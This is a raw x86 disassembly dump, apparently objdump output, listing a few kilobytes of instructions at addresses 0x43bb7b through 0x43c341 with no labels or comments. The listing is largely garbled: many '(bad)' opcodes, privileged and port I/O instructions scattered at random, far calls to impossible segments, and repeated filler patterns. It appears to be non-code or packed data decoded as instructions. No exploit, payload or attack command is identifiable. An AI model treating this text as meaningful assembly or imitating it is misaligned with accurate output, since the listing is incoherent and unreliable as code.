  43bb7b:	cmp    edi,0x8d00ff00
  43bb81:	rcr    edi,0x46
  43bb84:	(bad)  
  43bb85:	inc    DWORD PTR [eax]
  43bb87:	push   DWORD PTR [ecx-0x44]
  43bb8a:	inc    ebx
  43bb8b:	loop   0x43bb8c
  43bb8d:	int3   
  43bb8e:	inc    DWORD PTR [ebx-0x7aaff0e7]
  43bb94:	inc    DWORD PTR [eax]
  43bb96:	int3   
  43bb97:	or     DWORD PTR [edi-0x37],0xffffffaf
  43bb9b:	lock inc DWORD PTR [ebx+0xb36ffff]
  43bba2:	icebp  
  43bba3:	mov    BYTE PTR [eax],al
  43bba5:	int3   
  43bba6:	dec    DWORD PTR [ecx-0x412e34df]
  43bbac:	(bad)  
  43bbad:	(bad)  
  43bbae:	(bad)  
  43bbaf:	(bad)  
  43bbb0:	fistp  QWORD PTR [eax]
  43bbb2:	mov    bh,0x10
  43bbb4:	(bad)  
  43bbb5:	(bad)  
  43bbb6:	(bad)  
  43bbb7:	inc    DWORD PTR [ebx]
  43bbb9:	dec    esi
  43bbba:	add    al,dl
  43bbbc:	inc    DWORD PTR [eax]
  43bbbe:	add    BYTE PTR [ebx-0x77d99a5e],al
  43bbc4:	cmp    edi,0xffffffff
  43bbc7:	jmp    DWORD PTR [edi+0x34]
  43bbca:	call   0x840fbbf3
  43bbcf:	int3   
  43bbd0:	or     al,ah
  43bbd2:	enter  0xff30,0x83
  43bbd6:	cmp    edi,0x2
  43bbd9:	pop    esp
  43bbda:	das    
  43bbdb:	test   eax,0xffffffff
  43bbe0:	call   0xffa74220
  43bbe5:	add    bh,bh
  43bbe7:	add    BYTE PTR [esi+0x6e],dl
  43bbea:	or     DWORD PTR [esp+ecx*8],ebx
  43bbed:	inc    DWORD PTR [eax]
  43bbef:	add    BYTE PTR [ecx],dl
  43bbf1:	jae    0x43bbf3
  43bbf3:	ud0    eax,DWORD PTR [ebx+0x322ffff]
  43bbfa:	arpl   WORD PTR [edx-0x33ff01],sp
  43bc00:	cwde   
  43bc01:	bnd jp 0x43bc3a
  43bc04:	add    bh,bh
  43bc06:	int3   
  43bc07:	mov    ebx,ebx
  43bc09:	cli    
  43bc0a:	pshufb mm0,QWORD PTR [eax]
  43bc0e:	add    DWORD PTR [ebx-0xdfe2336],0xffffff83
  43bc15:	mov    DWORD PTR [ebx+0x2a14f00],eax
  43bc1b:	add    BYTE PTR [ebx+0x72898300],0x4e
  43bc22:	je     0x43bc0c
  43bc24:	mov    DWORD PTR [ecx+0x4aeb0083],ecx
  43bc2a:	xchg   esi,eax
  43bc2b:	xchg   edx,eax
  43bc2c:	dec    DWORD PTR [ecx+0x45f7ff00]
  43bc32:	hlt    
  43bc33:	pushf  
  43bc34:	add    BYTE PTR [eax],al
  43bc36:	add    bh,bh
  43bc38:	sahf   
  43bc39:	adc    BYTE PTR [esi+eiz*1+0x0],ch
  43bc3d:	add    BYTE PTR [eax],al
  43bc3f:	mov    DWORD PTR [edx+ecx*1-0x29],ebp
  43bc43:	enter  0xffff,0x0
  43bc47:	push   esi
  43bc49:	call   0xff:0xffe861
  43bc50:	sbb    DWORD PTR ds:0xcccc25a4,esp
  43bc56:	(bad)  
  43bc57:	dec    DWORD PTR [ecx+0x6c]
  43bc5a:	sub    ebp,esp
  43bc5c:	add    BYTE PTR [eax],al
  43bc5e:	add    DWORD PTR [eax],0x2e
  43bc61:	pop    ss
  43bc62:	nop
  43bc63:	(bad)  
  43bc64:	inc    DWORD PTR [eax]
  43bc66:	add    bh,bh
  43bc68:	imul   esi,ecx,0xffcc64ac
  43bc6e:	or     DWORD PTR [ecx-0x1b80801e],0xffffff83
  43bc75:	add    BYTE PTR [eax],al
  43bc77:	call   DWORD PTR [esp+ebp*4]
  43bc7a:	add    al,BYTE PTR [edi+0x83ccff]
  43bc80:	sub    BYTE PTR [ebp-0x1],dl
  43bc83:	(bad)  
  43bc85:	(bad)  
  43bc86:	inc    DWORD PTR [eax]
  43bc88:	ficom  WORD PTR [eax]
  43bc8a:	cmp    al,0x49
  43bc8c:	add    bh,bh
  43bc8e:	add    bh,bh
  43bc90:	add    BYTE PTR [ecx+ebx*1],al
  43bc93:	push   edi
  43bc94:	add    bh,bh
  43bc96:	inc    DWORD PTR [ebx-0x1dd6675b]
  43bc9c:	inc    DWORD PTR [ebx+0x369accff]
  43bca2:	jbe    0x43bcff
  43bca4:	add    DWORD PTR [ebx+0x16ba00cc],0x4d
  43bcab:	pop    edx
  43bcac:	int3   
  43bcad:	inc    DWORD PTR [eax]
  43bcaf:	add    BYTE PTR [eax+0x2d],dh
  43bcb2:	(bad)  
  43bcb3:	(bad)  
  43bcb4:	inc    DWORD PTR [eax]
  43bcb6:	add    DWORD PTR [eax],0x9
  43bcb9:	xchg   edx,eax
  43bcba:	shl    BYTE PTR [esi],cl
  43bcbc:	(bad)  
  43bcbd:	inc    DWORD PTR [eax]
  43bcbf:	call   DWORD PTR [eax-0x4b]
  43bcc2:	mov    ss:0xccff00,al
  43bcc8:	pop    es
  43bcc9:	push   cs
  43bcca:	pop    edi
  43bccb:	in     eax,0xff
  43bccd:	inc    DWORD PTR [eax]
  43bccf:	call   ebp
  43bcd1:	push   eax
  43bcd2:	aas    
  43bcd3:	inc    edi
  43bcd4:	int3   
  43bcd5:	int3   
  43bcd6:	inc    DWORD PTR [eax]
  43bcd8:	sbb    DWORD PTR [ebx+0xff349f],esi
  43bcde:	add    BYTE PTR [ecx+0x14a5055d],cl
  43bce4:	inc    DWORD PTR [ebx+0x175889cc]
  43bcea:	mov    ebp,0xff0000ef
  43bcef:	(bad)  
  43bcf0:	std    
  43bcf1:	xchg   edi,ebx
  43bcf3:	ins    DWORD PTR es:[edi],dx
  43bcf4:	dec    DWORD PTR [ecx-0x11c0001]
  43bcfa:	(bad)  
  43bcfb:	cmp    eax,0x830089ff
  43bd00:	ss mov ebp,0xffff8350
  43bd06:	add    DWORD PTR [eax],0x53
  43bd09:	adc    DWORD PTR [edx],edi
  43bd0b:	sub    edi,edi
  43bd0d:	inc    DWORD PTR [eax]
  43bd0f:	add    BYTE PTR [ebp-0x44ef1b],al
  43bd15:	dec    esp
  43bd17:	add    BYTE PTR [ecx],bl
  43bd19:	sahf   
  43bd1a:	inc    ebp
  43bd1b:	mov    eax,ds:0x83ffff
  43bd20:	fld    TBYTE PTR [edx+0x5]
  43bd23:	and    esp,ecx
  43bd25:	add    DWORD PTR [ebx-0x23970701],0x6
  43bd2c:	add    bh,bh
  43bd2e:	add    BYTE PTR [ebx-0x75c76e53],al
  43bd34:	mov    edi,edi
  43bd36:	int3   
  43bd37:	and    DWORD PTR [eax-0x76cf4db6],0xffffffff
  43bd3e:	inc    DWORD PTR [ebx-0x7bd02800]
  43bd44:	add    bh,bh
  43bd46:	mov    edi,edi
  43bd48:	aad    0x87
  43bd4a:	sub    esp,DWORD PTR [edi-0xff7d]
  43bd50:	jns    0x43bd55
  43bd52:	rol    BYTE PTR [ebp+0x0],cl
  43bd55:	cmp    edi,0xffffff89
  43bd58:	ficomp WORD PTR [edx]
  43bd5a:	lods   al,BYTE PTR ds:[esi]
  43bd5b:	lods   al,BYTE PTR ds:[esi]
  43bd5c:	add    ah,cl
  43bd5e:	inc    DWORD PTR [eax]
  43bd60:	pop    es
  43bd61:	cmp    eax,0xff009a96
  43bd66:	mov    edi,edi
  43bd68:	(bad)  
  43bd69:	dec    esi
  43bd6a:	scas   eax,DWORD PTR es:[edi]
  43bd6b:	(bad)  
  43bd6c:	inc    DWORD PTR [eax]
  43bd6e:	add    bh,bh
  43bd70:	dec    ebx
  43bd71:	cmp    DWORD PTR [ebx+0x42],ebp
  43bd74:	add    bh,bh
  43bd76:	(bad)  
  43bd77:	push   ebp
  43bd79:	sub    DWORD PTR [esi-0x43],0xff008300
  43bd80:	clc    
  43bd81:	sti    
  43bd82:	fsub   QWORD PTR ds:0xffff00
  43bd88:	repz mov ax,ds:0x89cc005d
  43bd8f:	sub    DWORD PTR [edx-0x769da403],0xffffff89
  43bd96:	dec    DWORD PTR [ecx+0x1283a055]
  43bd9c:	cmp    edi,0xffffffff
  43bd9f:	call   FWORD PTR [esi+0x72]
  43bda2:	jbe    0x43bd6e
  43bda4:	add    bh,bh
  43bda6:	add    BYTE PTR [ebx-0x42f2b844],al
  43bdac:	add    BYTE PTR [ebx-0x735e0077],al
  43bdb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bdb3:	fwait
  43bdb4:	add    BYTE PTR [eax],al
  43bdb6:	inc    DWORD PTR [eax]
  43bdb8:	mov    ebx,cs
  43bdba:	inc    edi
  43bdbb:	mov    ecx,0xffffff83
  43bdc0:	test   eax,0xff5242f1
  43bdc5:	(bad)  
  43bdc6:	inc    DWORD PTR [ebx-0x1d4bc746]
  43bdcc:	mov    DWORD PTR [eax],eax
  43bdce:	add    BYTE PTR [ebx-0x641744d4],al
  43bdd4:	add    bh,bh
  43bdd6:	add    bh,bh
  43bdd8:	cmp    ch,BYTE PTR [eax]
  43bdda:	ret    0xff43
  43bddd:	(bad)  
  43bdde:	inc    DWORD PTR [ebx+0x61edbb8]
  43bde4:	add    bh,bh
  43bde6:	add    DWORD PTR [ebx-0x1eeb01d4],0x0
  43bded:	dec    esp
  43bdef:	add    BYTE PTR [edx-0x4386e4],bh
  43bdf5:	or     esp,0xffffffff
  43bdf8:	cmp    edx,eax
  43bdfa:	pop    esp
  43bdfb:	(bad)  
  43bdfc:	(bad)  
  43bdfd:	(bad)  
  43bdfe:	(bad)  
  43bdff:	push   DWORD PTR [ebx-0xe99033]
  43be05:	mov    edi,edi
  43be07:	add    BYTE PTR [edx],ah
  43be09:	adc    cl,BYTE PTR [ebx+0x6f]
  43be0c:	inc    DWORD PTR [eax]
  43be0e:	add    BYTE PTR [ebx-0x529d089d],al
  43be14:	(bad)  
  43be15:	(bad)  
  43be16:	(bad)  
  43be17:	(bad)  
  43be18:	fsubp  st(7),st
  43be1a:	xchg   edi,eax
  43be1b:	xchg   esi,eax
  43be1c:	add    BYTE PTR [ecx-0x15643400],cl
  43be22:	icebp  
  43be23:	inc    ecx
  43be24:	mov    edi,edi
  43be26:	add    BYTE PTR [ebx-0x781ed057],al
  43be2c:	add    ah,cl
  43be2e:	mov    DWORD PTR [ebx+0x59181531],eax
  43be34:	(bad)  
  43be35:	dec    DWORD PTR [ecx-0x6ec58701]
  43be3b:	mov    dl,0xff
  43be3d:	add    BYTE PTR [ecx+0x1356aaff],cl
  43be43:	leave  
  43be44:	add    BYTE PTR [eax],al
  43be46:	add    BYTE PTR [ebx-0x6fed3ab8],al
  43be4c:	inc    DWORD PTR [ebx+0x7f4000ff]
  43be52:	pop    ebp
  43be53:	fdivr  st,st(7)
  43be55:	add    BYTE PTR [ecx-0x16f73a7d],cl
  43be5b:	pop    edi
  43be5c:	int3   
  43be5d:	mov    DWORD PTR [eax],eax
  43be5f:	call   FWORD PTR [eax+0x615ae]
  43be65:	(bad)  
  43be66:	(bad)  
  43be67:	(bad)  
  43be68:	mov    edi,0xc80802
  43be6d:	dec    esp
  43be6f:	mov    DWORD PTR [esi],eax
  43be71:	mov    edx,0xff9730
  43be76:	add    bh,bh
  43be78:	sbb    esp,DWORD PTR [ecx-0x76f003]
  43be7e:	add    bh,bh
  43be80:	fisubr DWORD PTR [ebx-0xd735]
  43be86:	int3   
  43be87:	dec    DWORD PTR [edx-0x17]
  43be8a:	sub    DWORD PTR [ebp-0x7d],ebx
  43be8d:	add    bh,bh
  43be8f:	add    bl,bh
  43be91:	xor    eax,0x8900e3bd
  43be96:	cmp    edi,0xffffff80
  43be99:	pop    ebx
  43be9a:	pusha  
  43be9b:	lds    eax,FWORD PTR [eax]
  43be9d:	dec    esp
  43be9f:	jmp    DWORD PTR [eax+eax*2-0x53]
  43bea3:	dec    ecx
  43bea4:	cmp    edi,0xffffffff
  43bea7:	int3   
  43bea8:	rcr    BYTE PTR [ecx],1
  43beaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43beab:	bound  eax,QWORD PTR [eax]
  43bead:	mov    DWORD PTR [eax],eax
  43beaf:	add    BYTE PTR [esi+0x34],dh
  43beb2:	push   es
  43beb3:	aaa    
  43beb4:	add    ah,cl
  43beb6:	inc    DWORD PTR [eax]
  43beb8:	ror    DWORD PTR [esi+edi*4+0xcc4c],0x83
  43bec0:	rcr    ecx,0x4
  43bec3:	xchg   ecx,eax
  43bec4:	inc    DWORD PTR [eax]
  43bec6:	inc    DWORD PTR [eax]
  43bec8:	outs   dx,BYTE PTR ds:[esi]
  43bec9:	push   0x12
  43becb:	loopne 0x43becc
  43becd:	add    BYTE PTR [eax],al
  43becf:	(bad)  
  43bed0:	jl     0x43be70
  43bed2:	in     al,dx
  43bed3:	inc    eax
  43bed4:	add    DWORD PTR [eax],0xffffffff
  43bed7:	(bad)  
  43bed8:	jmp    0xff89:0xe560
  43bedf:	add    BYTE PTR [edi],ch
  43bee1:	jmp    0x8a42c40d
  43bee6:	inc    DWORD PTR [eax]
  43bee8:	xor    al,0x2b
  43beea:	sub    eax,0x83fff2
  43beef:	add    ah,ch
  43bef1:	ror    DWORD PTR [ebx-0x60],0x0
  43bef5:	dec    DWORD PTR [ecx-0x5e1b4b00]
  43befb:	cli    
  43befc:	inc    DWORD PTR [eax]
  43befe:	add    BYTE PTR [eax],al
  43bf00:	into   
  43bf01:	jecxz  0x43be8b
  43bf03:	mov    al,ds:0x8300ff89
  43bf08:	stc    
  43bf09:	test   DWORD PTR [edx+ebp*2-0x1],eax
  43bf0d:	dec    esp
  43bf0f:	inc    esp
  43bf11:	nop
  43bf12:	jns    0x43bf3d
  43bf14:	inc    DWORD PTR [ebx-0x3f660000]
  43bf1a:	push   0xffff0009
  43bf1f:	or     DWORD PTR [ebx+0x32],0xffffffc6
  43bf23:	repz add BYTE PTR [ecx+0x2c4bff89],cl
  43bf2a:	je     0x43bf01
  43bf2c:	add    DWORD PTR [eax],0xffffff83
  43bf2f:	add    BYTE PTR [ebp+0x77],ah
  43bf32:	mov    dh,0xed
  43bf34:	inc    DWORD PTR [eax]
  43bf36:	add    bh,bh
  43bf38:	sub    DWORD PTR [ebp+0x2e8c],ebp
  43bf3e:	inc    DWORD PTR [ebx-0x312c4f9b]
  43bf44:	dec    esp
  43bf46:	add    bh,bh
  43bf48:	(bad)  
  43bf49:	out    0x5a,eax
  43bf4b:	xchg   ecx,eax
  43bf4c:	(bad)  
  43bf4d:	dec    esp
  43bf4f:	add    ah,bh
  43bf51:	stc    
  43bf52:	adc    eax,0x83898a
  43bf57:	add    BYTE PTR [eax-0x76dded42],ch
  43bf5d:	cmp    edi,0xffffffcc
  43bf60:	ja     0x43beef
  43bf62:	dec    eax
  43bf63:	cs cmp edi,0xffffff83
  43bf67:	dec    DWORD PTR [eax]
  43bf69:	sub    eax,0x890033bd
  43bf6e:	or     esp,0x72
  43bf71:	add    BYTE PTR [edi-0x10],ch
  43bf74:	dec    esp
  43bf76:	add    DWORD PTR [eax],0x67
  43bf79:	mov    bl,0x10
  43bf7b:	stos   DWORD PTR es:[edi],eax
  43bf7c:	(bad)  
  43bf7d:	(bad)  
  43bf7e:	inc    DWORD PTR [eax]
  43bf80:	(bad)  
  43bf81:	mov    ecx,0xccffa28f
  43bf86:	add    BYTE PTR [eax],al
  43bf88:	xor    edi,ecx
  43bf8a:	rcl    DWORD PTR [ecx],1
  43bf8c:	(bad)  
  43bf8d:	dec    DWORD PTR [ecx+0x57a00883]
  43bf93:	outs   dx,BYTE PTR ds:[esi]
  43bf94:	(bad)  
  43bf95:	(bad)  
  43bf96:	inc    DWORD PTR [ebx+0x3db6f76]
  43bf9c:	dec    esp
  43bf9e:	(bad)  
  43bf9f:	(bad)  
  43bfa0:	cmp    BYTE PTR [eax+0xa68b],ah
  43bfa6:	inc    DWORD PTR [eax]
  43bfa8:	mov    ebx,0x89821dbf
  43bfad:	int3   
  43bfae:	add    BYTE PTR [ebx+0xe8a3a8e],al
  43bfb4:	dec    esp
  43bfb6:	add    BYTE PTR [eax],al
  43bfb8:	mov    cl,0xc2
  43bfba:	xchg   ecx,eax
  43bfbb:	add    bh,bh
  43bfbd:	dec    esp
  43bfbf:	inc    DWORD PTR [ebp-0x11]
  43bfc2:	mov    esi,0x89ffff46
  43bfc7:	add    BYTE PTR [ebp-0xb7cfba],bl
  43bfcd:	inc    DWORD PTR [ebx+0x24e9adff]
  43bfd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bfd4:	(bad)  
  43bfd5:	(bad)  
  43bfd6:	inc    DWORD PTR [eax]
  43bfd8:	cmp    eax,0xffe3316d
  43bfdd:	(bad)  
  43bfde:	(bad)  
  43bfdf:	jmp    DWORD PTR [ebx]
  43bfe1:	push   eax
  43bfe2:	lahf   
  43bfe3:	imul   eax,DWORD PTR [eax],0x0
  43bfe6:	add    DWORD PTR [eax],0x45
  43bfe9:	add    BYTE PTR [eax-0x27],0xff
  43bff0:	or     ah,BYTE PTR [esi-0x7cffbf2f]
  43bff6:	(bad)  
  43bff7:	inc    ebx
  43bff9:	pop    edx
  43bffa:	mov    ch,0x65
  43bffc:	(bad)  
  43bffd:	(bad)  
  43bffe:	inc    DWORD PTR [eax]
  43c000:	sub    edi,DWORD PTR [edx]
  43c002:	or     eax,ebx
  43c004:	add    bh,bh
  43c006:	(bad)  
  43c007:	(bad)  
  43c008:	dec    DWORD PTR [edi]
  43c00a:	jecxz  0x43bfc6
  43c00c:	cmp    edi,0xffffffff
  43c00f:	jmp    FWORD PTR [edi]
  43c011:	pop    ss
  43c012:	adc    DWORD PTR [eax-0x34],esi
  43c015:	add    BYTE PTR [eax],al
  43c017:	jmp    DWORD PTR [ecx]
  43c019:	ds (bad) 
  43c01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c01c:	dec    esp
  43c01e:	(bad)  
  43c01f:	inc    esp
  43c021:	in     eax,dx
  43c022:	(bad)  
  43c024:	inc    DWORD PTR [eax]
  43c026:	dec    DWORD PTR [ecx-0x7cef4688]
  43c02c:	int3   
  43c02d:	(bad)  
  43c02e:	inc    DWORD PTR [eax]
  43c030:	in     al,0x6c
  43c032:	push   ss
  43c033:	dec    BYTE PTR [ecx+0x78ff00ff]
  43c039:	int    0x2c
  43c03b:	out    0xff,al
  43c03d:	dec    esp
  43c03f:	add    al,cl
  43c041:	add    ecx,DWORD PTR [edx+0xf4]
  43c047:	add    BYTE PTR [ecx-0x4f],bl
  43c04a:	jl     0x43c05d
  43c04c:	add    bh,bh
  43c04e:	inc    DWORD PTR [eax]
  43c050:	push   ss
  43c051:	inc    esp
  43c052:	fld    QWORD PTR [edx]
  43c054:	inc    DWORD PTR [eax]
  43c056:	dec    DWORD PTR [ecx-0x78c9ed92]
  43c05c:	inc    DWORD PTR [ebx+0x3c9300ff]
  43c062:	pop    es
  43c063:	push   edi
  43c064:	inc    DWORD PTR [ebx+0x24a8383]
  43c06a:	rcr    BYTE PTR [esi],1
  43c06c:	cmp    edi,0xffffff83
  43c06f:	(bad)  
  43c070:	(bad)  [ebp-0x2e]
  43c073:	rol    DWORD PTR [eax],0xff
  43c076:	int3   
  43c077:	add    BYTE PTR [ebx],bl
  43c079:	pop    ebp
  43c07a:	mov    ch,0x21
  43c07c:	mov    edi,edi
  43c07e:	inc    DWORD PTR [eax]
  43c080:	xchg   edx,eax
  43c081:	jg     0x43c015
  43c083:	imul   edi,edi,0xcbffff00
  43c089:	in     eax,dx
  43c08a:	dec    BYTE PTR [ecx-0x1]
  43c08d:	inc    DWORD PTR [eax]
  43c08f:	inc    ebx
  43c091:	xchg   edi,eax
  43c092:	int    0x2c
  43c094:	cmp    edi,0x0
  43c097:	call   FWORD PTR [ebx+edx*2]
  43c09a:	bnd jbe 0x43c020
  43c09d:	(bad)  
  43c09e:	inc    DWORD PTR [ebx-0x5735bac8]
  43c0a4:	add    BYTE PTR [ebx-0x71267d00],al
  43c0aa:	popf   
  43c0ab:	dec    edi
  43c0ac:	add    ah,cl
  43c0ae:	or     DWORD PTR [ecx-0x4b80ada0],0xffffffff
  43c0b5:	(bad)  
  43c0b6:	(bad)  
  43c0b7:	jmp    FWORD PTR [eax+eiz*8-0x52]
  43c0bb:	(bad)  
  43c0bc:	inc    DWORD PTR [ebx-0x4e177d00]
  43c0c2:	jo     0x43c11a
  43c0c4:	(bad)  
  43c0c5:	inc    DWORD PTR [eax]
  43c0c7:	int3   
  43c0c8:	mov    esi,0x3083e0
  43c0cd:	add    bh,bh
  43c0cf:	int3   
  43c0d0:	out    0x5b,eax
  43c0d2:	and    DWORD PTR [ebp-0xff7c34],0xa53cbfd4
  43c0dc:	add    BYTE PTR [eax],al
  43c0de:	(bad)  
  43c0df:	inc    ebp
  43c0e1:	test   eax,0xccccc720
  43c0e6:	add    BYTE PTR [eax],al
  43c0e8:	mov    ebx,0x9c7d12
  43c0ed:	add    DWORD PTR [ebx+0x1740300],0x58
  43c0f4:	inc    DWORD PTR [eax]
  43c0f6:	add    bh,bh
  43c0f8:	call   0x8996f58b
  43c0fd:	inc    DWORD PTR [ebx-0xed58201]
  43c103:	out    dx,al
  43c104:	(bad)  
  43c105:	inc    DWORD PTR [eax]
  43c107:	(bad)  
  43c108:	mov    ebx,0xff82e83c
  43c10d:	mov    DWORD PTR [ebx+0x1dae4083],eax
  43c113:	stos   BYTE PTR es:[edi],al
  43c114:	(bad)  
  43c115:	inc    DWORD PTR [ebx+0x31527e00]
  43c11b:	push   ebp
  43c11c:	add    bh,bh
  43c11e:	dec    esp
  43c120:	adc    esi,DWORD PTR [edi+ebp*4]
  43c123:	mov    ebp,0xffffff89
  43c128:	lods   al,BYTE PTR ds:[esi]
  43c129:	stc    
  43c12a:	ins    DWORD PTR es:[edi],dx
  43c12b:	push   edi
  43c12c:	add    BYTE PTR [ecx-0x24c97700],cl
  43c132:	cld    
  43c133:	xlat   BYTE PTR ds:[ebx]
  43c134:	inc    DWORD PTR [eax]
  43c136:	inc    DWORD PTR [ebx-0x690aa190]
  43c13c:	inc    DWORD PTR [ebx-0x76797c77]
  43c142:	adc    eax,0xffffcc36
  43c147:	or     esp,0xffffffcc
  43c14a:	int3   
  43c14b:	int3   
  43c14c:	int3   
  43c14d:	int3   
  43c14e:	int3   
  43c14f:	int3   
  43c150:	retf   
  43c151:	int3   
  43c152:	jmp    FWORD PTR ds:0x4f8367cc
  43c158:	jl     0x43c159
  43c15a:	mov    DWORD PTR [edi-0x7d],eax
  43c15d:	jmp    DWORD PTR [ebx+0x6b]
  43c161:	int3   
  43c162:	push   DWORD PTR [ecx-0x7d]
  43c165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c166:	and    DWORD PTR [ebx-0x67],0xffffffcc
  43c16a:	mov    DWORD PTR [ebx-0x1],esi
  43c16d:	dec    esi
  43c16e:	add    BYTE PTR [eax],bl
  43c170:	and    al,0x0
  43c172:	inc    DWORD PTR [ecx-0x7d]
  43c175:	push   cs
  43c176:	or     esp,0x5a
  43c179:	inc    DWORD PTR [eax]
  43c17b:	pushf  
  43c17c:	add    BYTE PTR [eax+0xf0fc00],al
  43c182:	sub    DWORD PTR [edi+edi*8+0xb530065],0x0
  43c18a:	jmp    FWORD PTR [eax-0x237c6001]
  43c190:	sahf   
  43c191:	add    BYTE PTR [eax],al
  43c193:	jl     0x43c195
  43c195:	sbb    DWORD PTR [ebx-0x7696],eax
  43c19b:	test   DWORD PTR [eax],0x3582fff6
  43c1a1:	dec    esp
  43c1a3:	in     al,dx
  43c1a4:	mov    DWORD PTR [edx+0x734800],eax
  43c1aa:	push   ecx
  43c1ac:	add    bl,bl
  43c1ae:	(bad)  
  43c1af:	mov    edx,0xd838931
  43c1b4:	push   edx
  43c1b6:	add    dl,ch
  43c1b8:	and    BYTE PTR [ebx+0x2bffa1cc],al
  43c1be:	int3   
  43c1bf:	push   esi
  43c1c0:	add    cl,BYTE PTR [ecx-0x737ce901]
  43c1c6:	add    bl,ah
  43c1c8:	call   0xde:0x16cc83
  43c1cf:	xchg   ecx,eax
  43c1d0:	push   0xff24ffff
  43c1d5:	nop
  43c1d6:	int3   
  43c1d7:	push   0x6e
  43c1d9:	inc    DWORD PTR [eax]
  43c1db:	in     eax,0xff
  43c1dd:	xlat   BYTE PTR ds:[ebx]
  43c1de:	dec    ebp
  43c1e0:	mov    ebp,0xff76ffff
  43c1e5:	sub    DWORD PTR [eax],eax
  43c1e7:	push   es
  43c1e8:	sub    al,0xff
  43c1ea:	call   FWORD PTR [ebx+eax*4-0x28a27c72]
  43c1f1:	add    BYTE PTR [ebx+0x5ffc2],al
  43c1f7:	faddp  st(2),st
  43c1f9:	add    BYTE PTR [eax],al
  43c1fb:	out    dx,eax
  43c1fc:	call   FWORD PTR [ebp-0x7c097301]
  43c202:	call   DWORD PTR [esi-0x1]
  43c205:	adc    eax,0x2cfa89
  43c20a:	or     DWORD PTR [eax-0x1],0x35
  43c20e:	mov    DWORD PTR [edi],ebp
  43c210:	or     al,BYTE PTR [ebx-0x25ff4c00]
  43c216:	jmp    esi
  43c218:	(bad)  
  43c21a:	inc    DWORD PTR [ecx]
  43c21c:	jmp    DWORD PTR [edi-0x34]
  43c21f:	enter  0xcb,0x0
  43c223:	jl     0x43c224
  43c225:	jbe    0x43c227
  43c227:	fnstcw WORD PTR [esi-0x1]
  43c22a:	dec    ebp
  43c22c:	add    BYTE PTR [ebx-0x7cd41f01],bl
  43c232:	call   DWORD PTR [edi]
  43c234:	sbb    DWORD PTR [ebx-0x1],0xffffffa2
  43c238:	ss (bad) 
  43c23a:	(bad)  
  43c23b:	mov    edx,0x4983b483
  43c240:	call   0xff3b:0xff9d83ff
  43c247:	and    al,0xbf
  43c249:	inc    DWORD PTR [eax]
  43c24b:	jno    0x43c24c
  43c24d:	aad    0x83
  43c24f:	dec    edi
  43c250:	mov    eax,DWORD PTR [eax]
  43c252:	jmp    DWORD PTR [eax+eax*1-0x27]
  43c256:	(bad)  
  43c257:	mov    esi,0x30ffffd5
  43c25c:	jmp    FWORD PTR [esi+0x5faeff]
  43c262:	add    BYTE PTR [edi],dl
  43c264:	jmp    FWORD PTR [ebp-0x1]
  43c267:	and    BYTE PTR [eax+eax*1-0x1],ah
  43c26b:	pop    eax
  43c26c:	mov    DWORD PTR [eax-0x7d],ebx
  43c26f:	rol    BYTE PTR [edi-0xe40100],1
  43c275:	int    0x0
  43c277:	fs dec eax
  43c279:	int3   
  43c27a:	add    BYTE PTR [edi+0x3883a883],bl
  43c280:	push   ss
  43c281:	add    BYTE PTR [eax],al
  43c283:	call   DWORD PTR ss:[eax-0x7d]
  43c287:	ins    DWORD PTR es:[edi],dx
  43c288:	adc    bh,bh
  43c28a:	or     eax,0xffffff83
  43c28d:	inc    edi
  43c28e:	int3   
  43c28f:	dec    ecx
  43c290:	aad    0xcc
  43c292:	adc    DWORD PTR [ebx],0xffffff83
  43c295:	out    dx,al
  43c296:	mov    DWORD PTR [esi],edx
  43c298:	mov    ecx,0x14ff00
  43c29d:	push   ds
  43c29e:	xor    DWORD PTR [esi+edx*8],0xffffffff
  43c2a2:	add    BYTE PTR [ebp-0x40ffe201],dh
  43c2a8:	push   ds
  43c2a9:	inc    DWORD PTR [eax]
  43c2ab:	loope  0x43c279
  43c2ad:	sti    
  43c2ae:	call   FWORD PTR [ebx]
  43c2b0:	out    dx,al
  43c2b1:	add    DWORD PTR [eax],0xffffff89
  43c2b4:	(bad)  
  43c2b5:	jp     0x43c240
  43c2b7:	ss inc esi
  43c2b9:	inc    DWORD PTR [ebx-0xa033ce]
  43c2bf:	inc    esi
  43c2c0:	int3   
  43c2c1:	inc    DWORD PTR [eax]
  43c2c3:	ins    BYTE PTR es:[edi],dx
  43c2c4:	int3   
  43c2c5:	xchg   esp,eax
  43c2c6:	inc    ecx
  43c2c8:	jge    0x43c2ca
  43c2ca:	add    BYTE PTR [ecx-0x1],cl
  43c2cd:	fild   WORD PTR [eax]
  43c2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c2d0:	nop
  43c2d1:	inc    DWORD PTR [eax]
  43c2d3:	xor    edi,edi
  43c2d5:	call   DWORD PTR [bp+si]
  43c2d8:	test   bh,bh
  43c2da:	dec    DWORD PTR [eax-0x6c7c5a77]
  43c2e0:	cs (bad) 
  43c2e2:	dec    DWORD PTR [eax+eax*1+0x7d68ff23]
  43c2e9:	add    ah,cl
  43c2eb:	lahf   
  43c2ec:	add    BYTE PTR [edx+0x80bd00],bh
  43c2f2:	(bad)  
  43c2f3:	cmp    al,0x0
  43c2f5:	call   0x834e1ff9
  43c2fa:	push   DWORD PTR [eax-0x45ff4f77]
  43c300:	enter  0xffff,0xfb
  43c304:	push   DWORD PTR [eax+0x0]
  43c307:	mov    ebx,DWORD PTR [esp+ecx*8-0x1]
  43c30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c30c:	add    BYTE PTR [eax-0x1],al
  43c30f:	ins    BYTE PTR es:[edi],dx
  43c310:	mov    esp,0xff9089ff
  43c315:	pop    ds
  43c316:	mov    ebp,edi
  43c318:	xor    eax,0x7f00ff
  43c31d:	adc    BYTE PTR [ecx-0x5f1],cl
  43c323:	adc    bh,bh
  43c325:	and    DWORD PTR [ecx-0x7c001ba8],ecx
  43c32b:	jns    0x43c32c
  43c32d:	pop    ds
  43c32e:	add    bl,bl
  43c330:	xchg   ecx,eax
  43c331:	add    BYTE PTR [eax],al
  43c333:	out    dx,eax
  43c334:	call   FWORD PTR [edi]
  43c336:	sbb    DWORD PTR [edx-0x45ff00b0],0xffffffcc
  43c33d:	dec    ebp
  43c33e:	(bad)  
  43c33f:	cld    
  43c340:	cli    
  43c341:	add    bh,bh
